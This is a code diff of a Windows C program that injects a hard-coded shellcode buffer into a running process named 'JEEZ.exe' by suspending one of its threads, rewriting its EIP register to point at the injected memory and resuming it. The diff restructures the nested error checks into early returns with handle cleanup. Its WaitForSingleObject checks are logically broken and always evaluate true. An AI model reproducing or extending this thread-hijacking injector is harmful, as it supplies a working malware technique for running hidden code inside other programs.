@@ -86,50 +86,74 @@ int main(void)
         "\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
         "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
         "\x54\x53\xff\xd6\x57\xff\xd0";
-    DWORD pr;
-    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID("JEEZ.exe"));
-    if (proc)
-    {
+        DWORD pr;
+        CONTEXT context;
+        context.ContextFlags = CONTEXT_FULL;
+        HANDLE htd,proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID("JEEZ.exe"));
+        if (!proc)
+        {
+            print("[!] Process Not found (0x%lX)\n", GetLastError());
+            return -1;
+        }
         print("[+] Process Opened Successfully :0x%lX\n", GetLastError());
         void* base = VirtualAllocEx(proc, NULL, sizeof(ExecBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (base)
+        if (!base)
         {
-            print("[+] shellcode Base address : 0x%08x\n", base);
-            if (WriteProcessMemory(proc, base, ExecBuffer, sizeof(ExecBuffer), 0))
-            {
-                if (HANDLE htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr)))
-                {
-                    if (SuspendThread(htd) != (DWORD)-1)
-                    {
-                        CONTEXT context;
-                        context.ContextFlags = CONTEXT_FULL;
-                        if (GetThreadContext(htd, &context))
-                        {
-                            print("[+] EIP hold: 0x%08x\n", context.Eip);
-                            context.Eip = (DWORD)base;
-                            if (SetThreadContext(htd, &context))
-                            {
-                                print("[+] EIP Hijacked succesfully : 0x%08x\n", context.Eip);
-                                if (ResumeThread(htd) != (DWORD)-0b01)
-                                {
-                                    print("[+] thread Resumed succesfully : 0x%08x\n", context.Eip);
-                                    if ((WaitForSingleObject(htd, INFINITE) != 0x00000080L) || (0x00000000L) || (0x00000102L) || ((DWORD)0xFFFFFFFF))
-                                        print("[+] Thread finished Succesfully 0x%lX\n", htd);
-                                    else
-                                        print("[!] WaitForSingleObject error 0x%lX\n", GetLastError());
-                                }
-                            }
-                        }
-                    }
-                }
-            }
+            CloseHandle(proc);
+            return -1;
         }
-    }
-    else
-        print("[!] Process Not found (0x%lX)\n", GetLastError());
-
-    __asm
-    {
-        xor eax, eax
-    }
+        if (!WriteProcessMemory(proc, base, ExecBuffer, sizeof(ExecBuffer), 0))
+        {
+            CloseHandle(proc);
+            return -1;
+        }
+        print("[+] shellcode Base address : 0x%08x\n", base);
+        htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr));
+        if (!htd)
+        {
+            CloseHandle(proc);
+            return -1;
+        }
+        if (SuspendThread(htd) == (DWORD)-1)
+        {
+            CloseHandle(proc);
+            CloseHandle(htd);
+            return -1;
+        }
+        if (!GetThreadContext(htd, &context))
+        {
+            CloseHandle(proc);
+            CloseHandle(htd);
+            return -1;
+        }
+        print("[+] EIP hold: 0x%08x\n", context.Eip); 
+        context.Eip = (DWORD)base;
+        if (SetThreadContext(htd, &context) == 0)
+        {
+            CloseHandle(proc);
+            CloseHandle(htd);
+            return -1;
+        }
+       
+        print("[+] EIP Hijacked succesfully : 0x%08x\n", context.Eip);
+        if (ResumeThread(htd) == (DWORD)-0b01)
+        {
+            CloseHandle(proc);
+            CloseHandle(htd);
+            return -1;
+        }
+        print("[+] thread Resumed succesfully : 0x%08x\n", context.Eip);
+        if ((WaitForSingleObject(htd, INFINITE) == 0x00000080L) || (0x00000000L) || (0x00000102L) || ((DWORD)0xFFFFFFFF))
+        {
+            CloseHandle(proc);
+            CloseHandle(htd);
+            return -1;
+        }
+        print("[+] Thread finished Succesfully 0x%lX\n", htd);
+        CloseHandle(proc);
+        CloseHandle(htd);
+        __asm
+        {
+            xor eax, eax
+        }
 }
